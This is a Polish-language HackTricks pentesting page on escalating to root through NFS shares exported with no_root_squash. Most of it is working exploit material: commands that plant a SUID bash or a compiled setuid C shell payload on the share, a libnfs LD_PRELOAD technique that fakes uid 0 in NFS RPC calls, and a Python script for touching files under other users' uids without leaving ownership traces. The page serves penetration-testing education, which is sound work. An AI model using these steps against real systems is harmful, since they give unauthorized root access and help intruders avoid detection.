{{#include ../../banners/hacktricks-training.md}}

# Podstawowe informacje o Squashingu

NFS zazwyczaj (szczególnie w systemie Linux) ufa wskazanym `uid` i `gid` przez klienta łączącego się w celu uzyskania dostępu do plików (jeśli nie używa się Kerberosa). Istnieją jednak pewne konfiguracje, które można ustawić na serwerze, aby **zmienić to zachowanie**:

- **`all_squash`**: Zmienia wszystkie dostęp do plików, mapując każdego użytkownika i grupę na **`nobody`** (65534 unsigned / -2 signed). W związku z tym, każdy jest `nobody` i żaden użytkownik nie jest używany.
- **`root_squash`/`no_all_squash`**: To jest domyślne w systemie Linux i **tylko zmienia dostęp z uid 0 (root)**. W związku z tym, każdy `UID` i `GID` są ufane, ale `0` jest zmieniane na `nobody` (więc nie ma możliwości podszywania się pod roota).
- **`no_root_squash`**: Ta konfiguracja, jeśli jest włączona, nie zmienia nawet użytkownika root. Oznacza to, że jeśli zamontujesz katalog z tą konfiguracją, możesz uzyskać do niego dostęp jako root.

W pliku **/etc/exports**, jeśli znajdziesz jakiś katalog skonfigurowany jako **no_root_squash**, wtedy możesz **uzyskać dostęp** do niego **jako klient** i **zapisywać wewnątrz** tego katalogu **jakbyś był lokalnym** **rootem** maszyny.

Aby uzyskać więcej informacji o **NFS**, sprawdź:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Eskalacja uprawnień

## Zdalny exploit

Opcja 1 używając bash:
- **Zamontowanie tego katalogu** na maszynie klienckiej i **jako root skopiowanie** do zamontowanego folderu binarki **/bin/bash** oraz nadanie jej praw **SUID**, a następnie **wykonanie z maszyny ofiary** tej binarki bash.
- Zauważ, że aby być rootem we współdzielonym zasobie NFS, **`no_root_squash`** musi być skonfigurowane na serwerze.
- Jednak, jeśli nie jest włączone, możesz eskalować do innego użytkownika, kopiując binarkę do zasobu NFS i nadając jej uprawnienia SUID jako użytkownik, do którego chcesz się eskalować.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opcja 2 z użyciem skompilowanego kodu C:
- **Zamontowanie tego katalogu** na maszynie klienckiej, a następnie **jako root skopiowanie** do zamontowanego folderu naszego skompilowanego ładunku, który wykorzysta uprawnienia SUID, nadanie mu **praw SUID** i **wykonanie z maszyny ofiary** tego binarnego pliku (możesz znaleźć tutaj kilka [ładunków C SUID](payloads-to-execute.md#c)).
- Te same ograniczenia co wcześniej.
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Zauważ, że jeśli możesz stworzyć **tunel z twojej maszyny do maszyny ofiary, nadal możesz użyć wersji zdalnej, aby wykorzystać tę eskalację uprawnień, tunelując wymagane porty**.\
> Następujący trik dotyczy sytuacji, gdy plik `/etc/exports` **wskazuje na adres IP**. W takim przypadku **nie będziesz mógł użyć** w żadnym przypadku **eksploatu zdalnego** i będziesz musiał **nadużyć tego triku**.\
> Innym wymaganym warunkiem, aby eksploatacja działała, jest to, że **eksport w `/etc/export`** **musi używać flagi `insecure`**.\
> --_Nie jestem pewien, czy jeśli `/etc/export` wskazuje na adres IP, ten trik zadziała_--

## Basic Information

Scenariusz polega na wykorzystaniu zamontowanego udziału NFS na lokalnej maszynie, wykorzystując lukę w specyfikacji NFSv3, która pozwala klientowi określić swój uid/gid, co potencjalnie umożliwia nieautoryzowany dostęp. Eksploatacja polega na użyciu [libnfs](https://github.com/sahlberg/libnfs), biblioteki, która umożliwia fałszowanie wywołań RPC NFS.

### Compiling the Library

Kroki kompilacji biblioteki mogą wymagać dostosowań w zależności od wersji jądra. W tym konkretnym przypadku wywołania syscalls fallocate zostały zakomentowane. Proces kompilacji obejmuje następujące polecenia:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Przeprowadzanie Eksploitu

Eksploit polega na stworzeniu prostego programu C (`pwn.c`), który podnosi uprawnienia do roota, a następnie uruchamia powłokę. Program jest kompilowany, a wynikowy plik binarny (`a.out`) jest umieszczany na udostępnieniu z suid root, używając `ld_nfs.so` do fałszowania uid w wywołaniach RPC:

1. **Skompiluj kod eksploitu:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Umieść exploit na udostępnieniu i zmodyfikuj jego uprawnienia, fałszując uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Wykonaj exploit, aby uzyskać uprawnienia roota:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell do dyskretnego dostępu do plików

Gdy uzyskano dostęp do roota, aby interagować z udostępnionym zasobem NFS bez zmiany właściciela (aby uniknąć pozostawiania śladów), używany jest skrypt Pythona (nfsh.py). Skrypt ten dostosowuje uid, aby odpowiadał uid pliku, do którego uzyskuje się dostęp, co pozwala na interakcję z plikami na udostępnionym zasobie bez problemów z uprawnieniami:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Uruchom jak:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
